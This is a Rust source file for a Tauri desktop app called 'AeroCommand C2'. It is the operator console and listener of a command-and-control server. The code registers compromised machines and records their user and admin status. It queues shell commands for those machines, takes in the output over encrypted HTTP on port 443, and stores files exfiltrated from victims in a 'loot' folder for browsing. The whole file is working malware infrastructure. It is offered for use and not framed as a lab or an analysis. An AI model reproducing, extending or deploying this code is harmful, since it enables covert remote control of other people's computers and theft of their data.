use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use std::thread;
use chrono::Local;
use tauri::State;
use base64::{engine::general_purpose, Engine as _};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Client {
    pub id: String,
    pub host: String,
    pub ip: String,
    pub pid: i32,
    pub os: String,
    pub user: String,
    pub admin: bool,
    pub first_seen: String,
    pub last_seen: String,
    pub status: String,
    pub cpu_usage: f32,
    pub ram_usage: f32,
    pub disk_usage: f32,
    pub net_usage: f32,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CommandLog {
    pub id: i32,
    pub client_id: String,
    pub command: String,
    pub output: String,
    pub timestamp: String,
    pub status: String,
}

use rsa::{RsaPrivateKey, RsaPublicKey, Oaep};
use rsa::pkcs1::{DecodeRsaPrivateKey, EncodeRsaPrivateKey};
use rsa::pkcs8::EncodePublicKey;
use aes::Aes256;
use aes_gcm::{AesGcm, Key, Nonce};
use aes_gcm::aead::generic_array::typenum::U16;
use aes_gcm::aead::{Aead, KeyInit};
use sha2::Sha256;
use std::fs;
use std::path::Path;

/// AES-256-GCM with 16-byte nonces — matches the PyCryptodome wire format
/// used by client.py/server.py (the default Aes256Gcm alias uses 12-byte nonces).
type Aes256GcmLong = AesGcm<Aes256, U16>;

pub struct AppState {
    pub clients: Mutex<Vec<Client>>,
    pub logs: Mutex<Vec<CommandLog>>,
    pub pending_commands: Mutex<std::collections::HashMap<String, Vec<String>>>,
    pub rsa_private_key: RsaPrivateKey,
    pub rsa_public_pem: String,
    pub client_sessions: Mutex<std::collections::HashMap<String, Vec<u8>>>,
    pub log_counter: Mutex<i32>,
}

// === C2 listener tuning ===
const C2_WORKER_THREADS: usize = 8;
const MAX_BODY_SMALL: u64 = 1024 * 1024; // register/result JSON payloads
const MAX_BODY_UPLOAD: u64 = 80 * 1024 * 1024; // base64 of a <=50MB file

fn load_or_generate_rsa_key() -> (RsaPrivateKey, String) {
    let key_path = "server_rsa.pem";
    if Path::new(key_path).exists() {
        if let Ok(pem_data) = fs::read_to_string(key_path) {
            if let Ok(priv_key) = RsaPrivateKey::from_pkcs1_pem(&pem_data) {
                let pub_key = RsaPublicKey::from(&priv_key);
                if let Ok(pub_pem) = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF) {
                    return (priv_key, pub_pem);
                }
            }
        }
    }

    let mut rng = rand::thread_rng();
    let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("failed to generate rsa key");
    let pub_key = RsaPublicKey::from(&priv_key);
    let priv_pem = priv_key.to_pkcs1_pem(rsa::pkcs8::LineEnding::LF).expect("failed priv pem");
    let pub_pem = pub_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF).expect("failed pub pem");
    let _ = fs::write(key_path, priv_pem);
    (priv_key, pub_pem)
}

fn decrypt_aes(raw_b64: &str, aes_key: &[u8]) -> Option<String> {
    if let Ok(raw) = general_purpose::STANDARD.decode(raw_b64) {
        if raw.len() < 32 { return None; }
        let nonce_bytes = &raw[0..16];
        let tag_bytes = &raw[16..32];
        let ciphertext = &raw[32..];

        let key = Key::<Aes256GcmLong>::from_slice(aes_key);
        let cipher = Aes256GcmLong::new(key);
        let nonce = Nonce::<U16>::from_slice(nonce_bytes);

        // Wire format shared with server.py/client.py: nonce (16) + tag (16) + ciphertext
        let mut combined = Vec::new();
        combined.extend_from_slice(ciphertext);
        combined.extend_from_slice(tag_bytes);

        if let Ok(decrypted) = cipher.decrypt(nonce, combined.as_ref()) {
            return String::from_utf8(decrypted).ok();
        }
    }
    None
}

fn encrypt_aes(json_str: &str, aes_key: &[u8]) -> String {
    let key = Key::<Aes256GcmLong>::from_slice(aes_key);
    let cipher = Aes256GcmLong::new(key);
    // Use 16-byte nonce to match Python convention (os.urandom(16))
    let mut nonce_bytes = [0u8; 16];
    use rand::RngCore;
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::<U16>::from_slice(&nonce_bytes);

    if let Ok(encrypted_tag) = cipher.encrypt(nonce, json_str.as_bytes()) {
        // encrypted_tag contains ciphertext + tag (16 bytes at end)
        let cipher_len = encrypted_tag.len() - 16;
        let ciphertext = &encrypted_tag[0..cipher_len];
        let tag = &encrypted_tag[cipher_len..];

        let mut payload = Vec::new();
        payload.extend_from_slice(&nonce_bytes);
        payload.extend_from_slice(tag);
        payload.extend_from_slice(ciphertext);
        return general_purpose::STANDARD.encode(payload);
    }
    String::new()
}

fn clean_client_id(raw_id: &str, remote_ip: &str, pid: Option<i64>) -> String {
    let mut id = raw_id.replace(" ", "")
        .replace("%3A", ":")
        .replace("%2E", ".")
        .replace("%2D", "-")
        .replace("%5F", "_");

    if id.starts_with("unknown") {
        id = id.replace("unknown", remote_ip);
    }

    // If the ID still doesn't have a PID (no colon) and we have one, append it
    if !id.contains(':') {
        if let Some(p) = pid {
            if p > 0 {
                id = format!("{}:{}", id, p);
            }
        }
    }

    id.trim().to_string()
}

/// Extract a single query parameter from a raw request URL ("/cmd?id=x&y=z")
fn query_param(url: &str, key: &str) -> Option<String> {
    let query = url.split_once('?')?.1;
    for pair in query.split('&') {
        let mut kv = pair.splitn(2, '=');
        if kv.next() == Some(key) {
            return kv.next().map(|v| v.to_string());
        }
    }
    None
}

/// Read the request body up to max_bytes; Err means the body exceeded the cap
fn read_body(request: &mut tiny_http::Request, max_bytes: u64) -> Result<String, ()> {
    use std::io::Read;
    let mut content = String::new();
    request.as_reader()
        .take(max_bytes.saturating_add(1))
        .read_to_string(&mut content)
        .map_err(|_| ())?;
    if content.len() as u64 > max_bytes {
        return Err(());
    }
    Ok(content)
}

fn respond_status(request: tiny_http::Request, code: u16) {
    let _ = request.respond(tiny_http::Response::from_string(String::new()).with_status_code(code));
}

#[tauri::command]
fn get_clients(state: State<Arc<AppState>>) -> Vec<Client> {
    state.clients.lock().unwrap().clone()
}

#[tauri::command]
fn get_logs(state: State<Arc<AppState>>) -> Vec<CommandLog> {
    state.logs.lock().unwrap().clone()
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct LootFile {
    pub name: String,
    pub path: String,
    pub size: u64,
    pub timestamp: String,
    pub client: String,
}

#[tauri::command]
fn get_loot() -> Vec<LootFile> {
    let mut loot = vec![];
    let loot_dir = std::path::Path::new("loot");
    if !loot_dir.exists() {
        return loot;
    }

    if let Ok(entries) = std::fs::read_dir(loot_dir) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let client_name = entry.file_name().to_string_lossy().to_string();
                if let Ok(sub_entries) = std::fs::read_dir(entry.path()) {
                    for sub_entry in sub_entries.flatten() {
                        if sub_entry.path().is_file() {
                            let metadata = sub_entry.metadata().unwrap();
                            loot.push(LootFile {
                                name: sub_entry.file_name().to_string_lossy().to_string(),
                                path: sub_entry.path().to_string_lossy().to_string(),
                                size: metadata.len(),
                                timestamp: metadata.modified().map(|t| {
                                    let dt: chrono::DateTime<chrono::Local> = t.into();
                                    dt.format("%Y-%m-%d %H:%M:%S").to_string()
                                }).unwrap_or_default(),
                                client: client_name.clone(),
                            });
                        }
                    }
                }
            }
        }
    }
    loot.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
    loot
}

fn is_safe_loot_path(requested: &str) -> Result<std::path::PathBuf, String> {
    let p = Path::new(requested);
    // Reject directory traversal sequences and absolute paths outside loot
    if requested.contains("..") {
        return Err("Path traversal detected".to_string());
    }
    let canonical_loot = std::fs::canonicalize("loot").unwrap_or_else(|_| std::path::PathBuf::from("loot"));
    let canonical_req = std::fs::canonicalize(p).map_err(|e| format!("Invalid path: {}", e))?;
    if !canonical_req.starts_with(&canonical_loot) {
        return Err("Access denied: path outside loot directory".to_string());
    }
    Ok(canonical_req)
}

fn sanitize_filename(name: &str) -> String {
    // Strip directory components, keep only file name, replace unsafe chars
    let base = Path::new(name).file_name().and_then(|n| n.to_str()).unwrap_or("file");
    base.chars().map(|c| if c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' ) { c } else { '_' }).collect()
}

#[tauri::command]
fn get_loot_file(path: String) -> Result<String, String> {
    let safe = is_safe_loot_path(&path)?;
    let content = std::fs::read(&safe).map_err(|e| e.to_string())?;
    if content.len() > 10 * 1024 * 1024 {
        return Err("File too large".to_string());
    }
    Ok(general_purpose::STANDARD.encode(content))
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct PreviewData {
    pub status: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub r#type: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mime: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub content: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub size: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[tauri::command]
fn preview_file(path: String) -> PreviewData {
    // Security: only allow preview from loot directory
    let safe_path = match is_safe_loot_path(&path) {
        Ok(p) => p,
        Err(msg) => {
            return PreviewData {
                status: "error".to_string(),
                r#type: None,
                name: Some(Path::new(&path).file_name().unwrap_or_default().to_string_lossy().to_string()),
                path: Some(path),
                mime: None,
                data: None,
                content: None,
                size: None,
                message: Some(msg),
            };
        }
    };
    let p = safe_path.as_path();
    if !p.exists() {
        return PreviewData {
            status: "error".to_string(),
            r#type: None,
            name: Some(p.file_name().unwrap_or_default().to_string_lossy().to_string()),
            path: Some(path),
            mime: None,
            data: None,
            content: None,
            size: None,
            message: Some("File not found".to_string()),
        };
    }

    let name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
    let ext = p.extension().unwrap_or_default().to_string_lossy().to_lowercase();

    let image_exts = ["png", "jpg", "jpeg", "gif", "bmp", "webp", "ico"];
    let text_exts = ["txt", "log", "json", "xml", "yaml", "yml", "md", "ini", "cfg", "conf", "bat", "ps1", "sh", "py", "js", "ts", "html", "css", "csv", "toml"];

    if image_exts.contains(&ext.as_str()) {
        match std::fs::read(p) {
            Ok(bytes) => {
                let mime = match ext.as_str() {
                    "jpg" | "jpeg" => "image/jpeg",
                    "gif" => "image/gif",
                    "bmp" => "image/bmp",
                    "webp" => "image/webp",
                    "ico" => "image/x-icon",
                    _ => "image/png",
                };
                let meta = std::fs::metadata(p).ok();
                PreviewData {
                    status: "ok".to_string(),
                    r#type: Some("image".to_string()),
                    name: Some(name),
                    path: Some(path),
                    mime: Some(mime.to_string()),
                    data: Some(general_purpose::STANDARD.encode(bytes)),
                    content: None,
                    size: meta.map(|m| format!("{} bytes", m.len())),
                    message: None,
                }
            }
            Err(e) => PreviewData {
                status: "error".to_string(),
                r#type: None,
                name: Some(name),
                path: Some(path),
                mime: None,
                data: None,
                content: None,
                size: None,
                message: Some(format!("Failed to read image: {}", e)),
            },
        }
    } else if text_exts.contains(&ext.as_str()) {
        match std::fs::read_to_string(p) {
            Ok(text) => {
                let meta = std::fs::metadata(p).ok();
                let size_bytes = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                if size_bytes > 1_048_576 {
                    return PreviewData {
                        status: "error".to_string(),
                        r#type: None,
                        name: Some(name),
                        path: Some(path),
                        mime: None,
                        data: None,
                        content: None,
                        size: None,
                        message: Some("File too large for preview (>1MB)".to_string()),
                    };
                }
                PreviewData {
                    status: "ok".to_string(),
                    r#type: Some("text".to_string()),
                    name: Some(name),
                    path: Some(path),
                    mime: Some("text/plain".to_string()),
                    data: None,
                    content: Some(text),
                    size: meta.map(|m| format!("{} bytes", m.len())),
                    message: None,
                }
            }
            Err(e) => PreviewData {
                status: "error".to_string(),
                r#type: None,
                name: Some(name),
                path: Some(path),
                mime: None,
                data: None,
                content: None,
                size: None,
                message: Some(format!("Failed to read file: {}", e)),
            },
        }
    } else {
        let meta = std::fs::metadata(p).ok();
        PreviewData {
            status: "unsupported".to_string(),
            r#type: None,
            name: Some(name),
            path: Some(path),
            mime: None,
            data: None,
            content: None,
            size: meta.map(|m| format!("{} bytes", m.len())),
            message: Some("Preview not available for this file type".to_string()),
        }
    }
}

#[tauri::command]
fn send_command(client_id: String, command: String, state: State<Arc<AppState>>) -> String {
    let mut pending = state.pending_commands.lock().unwrap();
    pending.entry(client_id.clone()).or_insert(vec![]).push(command.clone());

    let mut logs = state.logs.lock().unwrap();
    let new_id = {
        let mut ctr = state.log_counter.lock().unwrap();
        *ctr += 1;
        *ctr
    };
    logs.push(CommandLog {
        id: new_id,
        client_id,
        command,
        output: "Queued...".to_string(),
        timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        status: "PENDING".to_string(),
    });
    // Cap in-memory log growth
    if logs.len() > 500 {
        let excess = logs.len() - 500;
        logs.drain(0..excess);
    }

    "OK".to_string()
}

fn decrypt_request_payload(content: &str, client_id_opt: Option<&str>, state: &AppState) -> Option<serde_json::Value> {
    if let Some(cid) = client_id_opt {
        let sessions = state.client_sessions.lock().unwrap();
        if let Some(aes_key) = sessions.get(cid) {
            if let Some(decrypted_str) = decrypt_aes(content, aes_key) {
                if let Ok(val) = serde_json::from_str(&decrypted_str) {
                    return Some(val);
                }
            }
        }
    }

    if let Ok(packet) = serde_json::from_str::<serde_json::Value>(content) {
        if let (Some(enc_key_b64), Some(payload_b64)) = (packet["encrypted_session_key"].as_str(), packet["payload"].as_str()) {
            if let Ok(enc_key_bytes) = general_purpose::STANDARD.decode(enc_key_b64) {
                let padding = Oaep::new::<Sha256>();
                if let Ok(aes_key) = state.rsa_private_key.decrypt(padding, &enc_key_bytes) {
                    if let Some(decrypted_str) = decrypt_aes(payload_b64, &aes_key) {
                        if let Ok(inner_val) = serde_json::from_str::<serde_json::Value>(&decrypted_str) {
                            if let Some(cid) = inner_val["client_id"].as_str() {
                                let mut sessions = state.client_sessions.lock().unwrap();
                                sessions.insert(cid.to_string(), aes_key);
                            } else if let (Some(ip), Some(pid)) = (inner_val["ip"].as_str(), inner_val["pid"].as_i64()) {
                                let raw_id = inner_val["client_id"].as_str().unwrap_or("unknown");
                                let cid = clean_client_id(raw_id, ip, Some(pid));
                                let mut sessions = state.client_sessions.lock().unwrap();
                                sessions.insert(cid, aes_key);
                            }
                            return Some(inner_val);
                        }
                    }
                }
            }
            // If it's a hybrid packet and decryption failed, do not return the encrypted outer JSON!
            return None;
        }
    }

    // Plaintext bodies are rejected — every accepted payload must be encrypted.
    None
}

fn encrypt_response_for_client(json_val: serde_json::Value, client_id: &str, state: &AppState) -> String {
    let json_str = serde_json::to_string(&json_val).unwrap_or_default();
    let sessions = state.client_sessions.lock().unwrap();
    if let Some(aes_key) = sessions.get(client_id) {
        return encrypt_aes(&json_str, aes_key);
    }
    // No session key — empty body. The channel never degrades to plaintext.
    String::new()
}

fn handle_c2_request(mut request: tiny_http::Request, state: &Arc<AppState>) {
    let url = request.url().to_string();
    let client_ip = request.remote_addr().map(|a| a.ip().to_string()).unwrap_or_else(|| "0.0.0.0".to_string());
    let clean_url = format!("/{}", url.split('?').next().unwrap_or("").trim_start_matches('/'));

    if clean_url.starts_with("/rsa_pub") {
        let _ = request.respond(tiny_http::Response::from_string(state.rsa_public_pem.clone()));
    } else if clean_url.starts_with("/register") {
        println!("[+] REGISTRATION PACKET RECEIVED from {}", client_ip);
        let content = match read_body(&mut request, MAX_BODY_SMALL) {
            Ok(c) => c,
            Err(_) => {
                println!("[!] Registration body too large from {}", client_ip);
                respond_status(request, 413);
                return;
            }
        };

        if let Some(info) = decrypt_request_payload(&content, None, state) {
            println!("[DEBUG] Decrypted Registration: {}", info);
            let mut ip = info["ip"].as_str().unwrap_or("unknown").trim().to_string();
            if ip == "unknown" || ip == "127.0.0.1" {
                ip = client_ip.trim().to_string();
            }

            let pid = info["pid"].as_i64().unwrap_or(0);
            let raw_id = info["client_id"].as_str().unwrap_or("unknown");
            let client_id = clean_client_id(raw_id, &ip, Some(pid));

            let mut clients = state.clients.lock().unwrap();
            let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();

            println!("[+] Registering client: {} (Host: {})", client_id, info["host"].as_str().unwrap_or("Unknown"));

            if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                c.last_seen = now;
                c.status = "ALIVE".to_string();
                c.pid = pid as i32;
                c.host = info["host"].as_str().unwrap_or(&c.host).to_string();
            } else {
                clients.push(Client {
                    id: client_id,
                    host: info["host"].as_str().unwrap_or("Unknown").trim().to_string(),
                    ip: ip,
                    pid: pid as i32,
                    os: info["os"].as_str().unwrap_or("Unknown").trim().to_string(),
                    user: info["user"].as_str().unwrap_or("Unknown").trim().to_string(),
                    admin: info["admin"].as_bool().unwrap_or(false),
                    first_seen: now.clone(),
                    last_seen: now,
                    status: "ALIVE".to_string(),
                    cpu_usage: 0.0,
                    ram_usage: 0.0,
                    disk_usage: 0.0,
                    net_usage: 0.0,
                });
            }
        } else {
            println!("[!] FAILED TO DECRYPT registration packet from {}", client_ip);
        }
        let _ = request.respond(tiny_http::Response::from_string("OK"));
    } else if clean_url.starts_with("/cmd") {
        let raw_id = query_param(&url, "id").unwrap_or_default();
        let client_id = clean_client_id(&raw_id, &client_ip, None);

        let mut response_json = serde_json::json!({});
        let mut is_known = false;

        if !client_id.is_empty() {
            let mut clients = state.clients.lock().unwrap();
            let now = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                c.last_seen = now;
                c.status = "ALIVE".to_string();
                is_known = true;
            }
        }

        if !is_known && !client_id.is_empty() {
            // Unknown client (server restarted) — signal via 401 so the
            // body stays either encrypted or empty, never plaintext.
            println!("[!] Unknown client {} polling. Sending 401 re-register signal.", client_id);
            respond_status(request, 401);
        } else if is_known {
            let mut pending = state.pending_commands.lock().unwrap();
            if let Some(cmds) = pending.get_mut(&client_id) {
                if !cmds.is_empty() {
                    response_json = serde_json::json!({"command": cmds.remove(0)});
                }
            }
            drop(pending);

            let encrypted = encrypt_response_for_client(response_json, &client_id, state);
            let _ = request.respond(tiny_http::Response::from_string(encrypted));
        } else {
            // No id supplied — nothing to say
            let _ = request.respond(tiny_http::Response::from_string(String::new()));
        }
    } else if clean_url.starts_with("/result") {
        println!("[+] COMMAND RESULT from {}", client_ip);
        let content = match read_body(&mut request, MAX_BODY_SMALL) {
            Ok(c) => c,
            Err(_) => {
                println!("[!] Result body too large from {}", client_ip);
                respond_status(request, 413);
                return;
            }
        };
        let raw_id = query_param(&url, "id").unwrap_or_default();
        let session_id = clean_client_id(&raw_id, &client_ip, None);

        if let Some(data) = decrypt_request_payload(&content, Some(&session_id), state) {
            let pid = data["pid"].as_i64();
            let raw_id = data["client_id"].as_str().unwrap_or("unknown");
            let client_id = clean_client_id(raw_id, &client_ip, pid);
            let output = data["output"].as_str().unwrap_or("").to_string();
            let command_name = data["command"].as_str().unwrap_or("Result").to_string();
            let mut logs = state.logs.lock().unwrap();

            // Check if this is telemetry data
            if let Ok(telemetry) = serde_json::from_str::<serde_json::Value>(&output) {
                if telemetry.get("cpu").is_some() || telemetry.get("ram").is_some() {
                    let mut clients = state.clients.lock().unwrap();
                    if let Some(c) = clients.iter_mut().find(|c| c.id == client_id) {
                        c.cpu_usage = telemetry["cpu"].as_f64().unwrap_or(0.0) as f32;
                        c.ram_usage = telemetry["ram"].as_f64().unwrap_or(0.0) as f32;
                        c.disk_usage = telemetry["disk"].as_f64().unwrap_or(0.0) as f32;
                        c.net_usage = telemetry["net"].as_f64().unwrap_or(0.0) as f32;
                    }
                }
            }

            // Try to find the most recent PENDING log for this client to update
            if let Some(log) = logs.iter_mut().rev().find(|l| l.client_id == client_id && l.status == "PENDING") {
                log.output = output;
                log.status = "SUCCESS".to_string();
                log.timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            } else {
                // Fallback: create new entry if no pending one found
                let new_id = {
                    let mut ctr = state.log_counter.lock().unwrap();
                    *ctr += 1;
                    *ctr
                };
                logs.push(CommandLog {
                    id: new_id,
                    client_id,
                    command: command_name,
                    output,
                    timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    status: "SUCCESS".to_string(),
                });
            }
            // Cap in-memory log growth
            if logs.len() > 500 {
                let excess = logs.len() - 500;
                logs.drain(0..excess);
            }
        } else {
            println!("[!] Undecryptable result payload from {}", client_ip);
        }
        let _ = request.respond(tiny_http::Response::from_string("OK"));
    } else if clean_url.starts_with("/upload") {
        println!("[+] FILE UPLOAD from {}", client_ip);
        let content = match read_body(&mut request, MAX_BODY_UPLOAD) {
            Ok(c) => c,
            Err(_) => {
                println!("[!] Upload body too large from {}", client_ip);
                respond_status(request, 413);
                return;
            }
        };
        let raw_id = query_param(&url, "id").unwrap_or_default();
        let session_id = clean_client_id(&raw_id, &client_ip, None);

        if let Some(data) = decrypt_request_payload(&content, Some(&session_id), state) {
            let filename = data["name"].as_str().unwrap_or("unknown");
            let b64_data = data["file"].as_str().unwrap_or("");
            let client_id = data["client_id"].as_str().unwrap_or("unknown");

            let mut host = "unknown".to_string();
            {
                let clients = state.clients.lock().unwrap();
                if let Some(c) = clients.iter().find(|c| c.id == client_id) {
                    host = c.host.clone();
                }
            }

            if let Ok(file_bytes) = general_purpose::STANDARD.decode(b64_data) {
                if file_bytes.len() > 50 * 1024 * 1024 {
                    println!("[!] Rejected oversized upload {} ({} bytes)", filename, file_bytes.len());
                } else {
                    // Both components are sanitized to [A-Za-z0-9._-], so the
                    // save path cannot escape the loot directory.
                    let safe_name = sanitize_filename(filename);
                    let safe_host = sanitize_filename(&host);
                    let client_loot_dir = std::path::Path::new("loot").join(&safe_host);
                    let _ = std::fs::create_dir_all(&client_loot_dir);
                    let save_path = client_loot_dir.join(&safe_name);
                    let _ = std::fs::write(&save_path, file_bytes);
                    println!("[+] Saved file {} for client {}", safe_name, safe_host);
                }
            }
        } else {
            println!("[!] Undecryptable upload payload from {}", client_ip);
        }
        let _ = request.respond(tiny_http::Response::from_string("OK"));
    } else {
        let _ = request.respond(tiny_http::Response::from_string("AeroCommand C2"));
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let (rsa_priv, rsa_pub_pem) = load_or_generate_rsa_key();

    let app_state = Arc::new(AppState {
        clients: Mutex::new(vec![]),
        logs: Mutex::new(vec![]),
        pending_commands: Mutex::new(std::collections::HashMap::new()),
        rsa_private_key: rsa_priv,
        rsa_public_pem: rsa_pub_pem,
        client_sessions: Mutex::new(std::collections::HashMap::new()),
        log_counter: Mutex::new(0),
    });

    let state_for_thread = Arc::clone(&app_state);
    thread::spawn(move || {
        let server = match tiny_http::Server::http("0.0.0.0:443") {
            Ok(s) => Arc::new(s),
            Err(e) => {
                eprintln!("[!] Failed to bind C2 listener on port 443: {}", e);
                return;
            }
        };
        println!("[+] AeroCommand C2 listening on port 443 (Hybrid AES+RSA, {} workers)", C2_WORKER_THREADS);

        // Worker pool: one slow client must not stall registration/polling/uploads
        let mut workers = Vec::new();
        for _ in 0..C2_WORKER_THREADS {
            let srv = Arc::clone(&server);
            let st = Arc::clone(&state_for_thread);
            workers.push(thread::spawn(move || {
                for request in srv.incoming_requests() {
                    handle_c2_request(request, &st);
                }
            }));
        }
        for w in workers {
            let _ = w.join();
        }
    });

    tauri::Builder::default()
        .manage(app_state)
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![get_clients, get_logs, send_command, get_loot, get_loot_file, preview_file])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn aes_gcm_roundtrip_matches_wire_format() {
        let key = [7u8; 32];
        let payload = r#"{"command":"pwd"}"#;
        let enc = encrypt_aes(payload, &key);
        assert_eq!(decrypt_aes(&enc, &key).as_deref(), Some(payload));
    }

    #[test]
    fn decrypts_pycryptodome_produced_vector() {
        // Generated by PyCryptodome AES-256-GCM with key=[42u8;32]:
        // base64(nonce[16] + tag[16] + ciphertext), plaintext b"interop-ok".
        // Guarantees the Rust side stays wire-compatible with the Python client/server.
        let key = [42u8; 32];
        let vector = "52r6szpXQbbR3UYNedtmE/3teCi6HnYL/gO8i9DOZjvneb1eGPaipueP";
        assert_eq!(decrypt_aes(vector, &key).as_deref(), Some("interop-ok"));
    }

    #[test]
    fn query_param_extracts_id() {
        assert_eq!(query_param("/cmd?id=1.2.3.4:999&x=1", "id").as_deref(), Some("1.2.3.4:999"));
        assert_eq!(query_param("/result?id=a:b", "id").as_deref(), Some("a:b"));
        assert_eq!(query_param("/cmd", "id"), None);
        assert_eq!(query_param("/upload?notid=1&id=2", "id").as_deref(), Some("2"));
    }

    #[test]
    fn sanitize_filename_blocks_traversal() {
        assert_eq!(sanitize_filename("..\\..\\evil.txt"), "evil.txt");
        assert_eq!(sanitize_filename("/etc/passwd"), "passwd");
        assert_eq!(sanitize_filename("normal.png"), "normal.png");
    }
}
